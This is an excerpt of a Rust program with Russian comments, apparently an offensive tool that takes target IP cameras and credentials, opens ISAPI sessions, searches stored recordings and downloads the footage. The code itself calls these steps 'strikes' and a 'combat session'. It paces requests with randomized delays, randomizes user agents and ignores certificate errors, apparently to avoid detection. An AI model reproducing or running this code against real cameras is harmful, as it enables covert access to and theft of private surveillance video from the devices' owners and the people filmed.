...
///
/// Протокол (из логов браузера):
/// 1. POST sessionLogin с <userName> + <password> (SHA-256 hash) + <sessionID>
/// 2. Камера отвечает 200 + Set-Cookie: WebSession_xxxxx=yyyyy
/// 3. Все дальнейшие запросы идут с этой cookie
async fn azgura_session_login(
    host: &str, login: &str, pass: &str,
    tx: &mpsc::Sender<HyperionEvent>,
) -> Option<reqwest::Client> {
    let mut rng = SandRng::new();
    let session_id = generate_session_id(&mut rng);
    let pass_hash = sha256_hex(pass);

    let _ = tx.send(HyperionEvent::NexusLog {
        message: format!("🔑 [TOKEN] Запрос боевой сессии (SHA-256)... sessionID={}", &session_id[..16]),
    }).await;

    // Cookie-jar клиент — автоматически сохраняет Set-Cookie
    let client = match build_cookie_client(15) { Ok(c) => c, Err(_) => return None };

    let ports = [2019u16, 80, 8080];
    for port in &ports {
        let url = format!("http://{}:{}/ISAPI/Security/sessionLogin", host, port);
        let body = format!(
            r#"<SessionLoginCap><sessionID>{}</sessionID><userName>{}</userName><password>{}</password><isSessionIDValidLongTerm>false</isSessionIDValidLongTerm><sessionIDVersion>2</sessionIDVersion></SessionLoginCap>"#,
            session_id, login, pass_hash
        );
            ...
            Ok(r) => {
                ...
                let _ = tx.send(HyperionEvent::NexusLog {
                    message: format!("🔑 [TOKEN] :{} → HTTP {} | cookies: {:?} | body: {}",
                        port, status, cookies, body.chars().take(120).collect::<String>()),
                }).await;

                if status == 200 && (body.contains("<statusValue>200</statusValue>") || body.contains("<statusString>OK</statusString>") || !cookies.is_empty()) {
                    let _ = tx.send(HyperionEvent::NexusLog {
    ...
    // Попытка 2: может sessionLogin не поддерживается, пробуем sessionLogin/capabilities
    // чтобы узнать формат
    for port in &ports {
        let url = format!("http://{}:{}/ISAPI/Security/sessionLogin/capabilities", host, port);
        ...
        if let Ok(r) = resp {
            let body = r.text().await.unwrap_or_default();
            let _ = tx.send(HyperionEvent::NexusLog {
                message: format!("🔑 [TOKEN] capabilities :{} → {}", port, body.chars().take(200).collect::<String>()),
            }).await;
        }
    }
...
async fn digest_request(
    ...
    let bootstrap = if is_2019 {
        apply_ie_bootstrap(client.request(method.clone(), url))
            .send().await.map_err(|e| format!("Bootstrap 2019: {}", e))?
    } else {
...
async fn search_isapi(
    ...
    let (from, to) = match clock_offset {
        Some(skew) if skew.abs() >= 3 => {
            ...
            (format!("{}-01-01T00:00:00Z", cy-1), format!("{}-12-31T23:59:59Z", cy+1))
        }
    ...
    for endpoint in &endpoints {
        ...
        for tid in &track_ids {
            sand_sleep(&mut rng, sand.api_delay_min_ms, sand.api_delay_max_ms, tx, &format!("search TID:{}", tid)).await;
            let xml = generate_search_xml(tid, &from, &to);

            let _ = tx.send(HyperionEvent::NexusLog {
                message: format!("🥷 [STRIKE] {} | TID:{} | {}..{}", endpoint, tid, &from[..10], &to[..10]),
            }).await;

            // === Стратегия 1: Cookie-based (если есть session) ===
            let resp_result = if let Some(sc) = session_client {
                ...
                match r {
                    ...
                    Ok(resp) => {
                        let _ = tx.send(HyperionEvent::NexusLog {
                            message: format!("📡 [TID:{}] Cookie → HTTP {} (fallback Digest)", tid, resp.status().as_u16()),
                        }).await;
                        None // fallback
                    }
                    Err(e) => {
            ...
            // === Стратегия 2: Digest fallback ===
            let resp_result = if resp_result.is_some() { resp_result } else {
                let client = if is_2019 { build_ie_client(15) } else { build_sand_client(&mut rng, 10) };
                let client = match client { Ok(c) => c, Err(_) => continue };
                let path = url_to_path(endpoint);
                match digest_request(&client, reqwest::Method::POST, endpoint, &path, login, pass, Some(xml), tx).await {
                    Ok(resp) => Some(resp),
                    Err(e) => { let _ = tx.send(HyperionEvent::NexusLog { message: format!("❌ [TID:{}] Digest: {}", tid, e) }).await; None }
                }
            };
            ...
            if let Some(resp) = resp_result {
                ...
                let _ = tx.send(HyperionEvent::NexusLog {
                    message: format!("📡 [TID:{}] HTTP {} | {} chars", tid, status, text.len()),
                }).await;
                ...
                if text.contains("<playbackURI>") || text.contains("<url>") || text.contains("<mediaSegmentDescriptor>") {
                    ...
                    if count > 0 {
                        ...
                        return (0..count).map(|i| IsapiHit {
                            endpoint: endpoint.clone(), track_id: tracks.get(i).cloned(),
                            start_time: starts.get(i).cloned(), end_time: ends.get(i).cloned(),
...
async fn sand_download_isapi(
    playback_uri: &str, login: &str, pass: &str, filename_hint: &str,
    session_client: &Option<reqwest::Client>,
    tx: &mpsc::Sender<HyperionEvent>,
) -> Result<String, String> {
    use futures_util::StreamExt;
    ...
    let client = reqwest::Client::builder().timeout(Duration::from_secs(30)).danger_accept_invalid_certs(true).user_agent(&ua).build().map_err(|e| e.to_string())?;
    let path = url_to_path(playback_uri);

    // HEAD для размера (Cookie-first)
    let head_resp = if let Some(sc) = session_client {
        sc.head(playback_uri).header("X-Requested-With","XMLHttpRequest").send().await.ok()
    } else { None };

    let total_size = head_resp.and_then(|r| if r.status().is_success() { r.content_length() } else { None }).unwrap_or(0);
    ...
    if total_size == 0 {
        return sand_download_isapi_stream(&client, playback_uri, &path, login, pass, &filename, &fpath, &task_key, session_client, tx).await;
    }
    ...
    let mut file = std::fs::OpenOptions::new().create(true).write(true).truncate(true).open(&fpath).map_err(|e| e.to_string())?;
    let mut current: u64 = 0; let mut chunk_n = 0u32; let started = Instant::now();
    ...
    while current < total_size {
        ...
        // Cookie-first chunk
        let resp = if let Some(sc) = session_client {
            let r = sc.get(playback_uri).header("Range", &range_hdr).header("X-Requested-With","XMLHttpRequest").send().await;
            match r { Ok(resp) if resp.status().as_u16() == 206 || resp.status().is_success() => Ok(resp), _ =>
                digest_download_request(&client, playback_uri, &path, login, pass, vec![("Range", range_hdr.clone())], tx).await }
        } else { digest_download_request(&client, playback_uri, &path, login, pass, vec![("Range", range_hdr.clone())], tx).await };

        let resp = resp?;
        let status = resp.status().as_u16();
        if status != 206 && status != 200 {
            if chunk_n == 0 {
                drop(file); let _ = std::fs::remove_file(&fpath);
                return sand_download_isapi_stream(&client, playback_uri, &path, login, pass, &filename, &fpath, &task_key, session_client, tx).await;
            }
        ...
        std::io::Write::write_all(&mut file, &data).map_err(|e| e.to_string())?;
        current += data.len() as u64; chunk_n += 1;

        if chunk_n % 4 == 0 || current >= total_size {
            let _ = tx.send(HyperionEvent::NexusLog { message: format!("🏖️ [SAND] #{} {:.1}/{:.1}MB ({:.0}%)", chunk_n, current as f64/1_048_576.0, total_size as f64/1_048_576.0, (current as f64/total_size as f64)*100.0) }).await;
        }
        let _ = tx.send(HyperionEvent::NexusLog { message: format!("DOWNLOAD_PROGRESS|{}|{}|{}", task_key, current, total_size) }).await;
        if current < total_size { tokio::time::sleep(Duration::from_millis(rng.range(sand.delay_min_ms, sand.delay_max_ms))).await; }
    }

    let _ = tx.send(HyperionEvent::NexusLog { message: format!("🏖️ [SAND] DONE: {} | {}chunks | {:.1}s", filename, chunk_n, started.elapsed().as_secs_f64()) }).await;
    Ok(fpath.to_string_lossy().to_string())
}
                ...
                match event {
                    ...
                    HyperionEvent::AnalyzeTarget { ip, port, login, pass } => {
                        ...
                        tokio::spawn(async move {
                            ...
                            let (isapi_ep, onvif_ep) = tokio::join!(probe_isapi(&host, &login, &pass, &tx_b), probe_onvif(&host, &tx_b));
                    ...
                    HyperionEvent::TargetAnalyzed { ip, port, login, pass, vendor, isapi_endpoint, onvif_endpoint, camera_time_offset, .. } => {
                        if isapi_endpoint.is_some() || onvif_endpoint.is_some() {
                            let _ = tx_i.send(HyperionEvent::ExecuteStrike { ip, port, login, pass, vendor, isapi_endpoint, onvif_endpoint, camera_time_offset }).await;
                        } else {
                    ...
                    HyperionEvent::ExecuteStrike { ip, login, pass, vendor, isapi_endpoint, onvif_endpoint, camera_time_offset, .. } => {
                        ...
                        tokio::spawn(async move {
                            ...
                            // 🔑 ПОЛУЧАЕМ БОЕВУЮ СЕССИЮ (SHA-256)
                            let session_client = if isapi_endpoint.is_some() {
                                ...
                                azgura_session_login(&host, &login, &pass, &tx_s).await
                            } else { None };

                            let (ih, oh) = tokio::join!(
                                async {
                                    if isapi_endpoint.is_some() {
                                        search_isapi(&host, &login, &pass, camera_time_offset, &session_client, &tx_s).await
                                    } else { vec![] }
                                },
                                async {
